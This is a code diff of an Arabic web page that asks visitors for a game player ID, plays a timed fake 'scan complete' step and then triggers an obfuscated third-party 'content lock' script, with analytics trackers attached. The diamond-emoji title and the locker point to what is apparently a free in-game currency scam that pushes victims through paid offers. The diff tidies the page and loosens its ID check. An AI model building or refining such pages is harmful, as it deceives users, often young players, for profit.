@@ -1,36 +1,24 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <!-- Statcounter code for Lolooo
-https://sites.google.com/view/homilo/home on Google Sites
-(new) -->
-<script type="text/javascript">
+  <script type="text/javascript">
 var sc_project=13206088; 
 var sc_invisible=1; 
 var sc_security="cb6f73f3"; 
 </script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13206088/0/cb6f73f3/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-WQ0798RDQ2"></script>
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-WQ0798RDQ2"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-WQ0798RDQ2');
 </script>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>  💎💎   </title>
+<title>💎💎</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
 <style>
@@ -137,7 +125,7 @@ border:1px solid #bcf0da;
 <div id="step1" class="step-card active">
 <h2>تسجيل الدخول بمعرف اللاعب</h2>
 <input type="text" id="p-id" class="input-box" placeholder="معرف اللاعب (ID)" inputmode="numeric">
-<p id="err" class="error">⚠️خطأ يجب إدخالID صحيح</p>
+<p id="err" class="error">⚠️ خطأ يرجى إدخال ID صحيح</p>
 <button class="btn-red" onclick="valID()">تسجيل الدخول</button>
 </div>
 
@@ -171,7 +159,8 @@ let playerID="";
 
 function valID(){
 const input=document.getElementById('p-id').value;
-if(/^\d{7,11}$/.test(input)){
+// تحديث الشرط ليكون من 9 إلى 12 رقم
+if(/^\d{9,12}$/.test(input)){
 playerID=input;
 document.getElementById('err').style.display='none';
 move(2);
@@ -203,14 +192,12 @@ document.getElementById('wait-text').innerText="اكتمل الفحص!";
 },1000);
 }
 
-/* 🔒 تشغيل قفل المحتوى */
 function final(){
 if(typeof _Vm==='function'){ _Vm(); }
 else{ alert("لم يتم تحميل قفل المحتوى بعد"); }
 }
 </script>
 
-<!-- 🔒 كود قفل المحتوى -->
 <script type="text/javascript">
 var UhZbL_Yle_eueSZc={"it":4591300,"key":"b4b85"};
 </script>
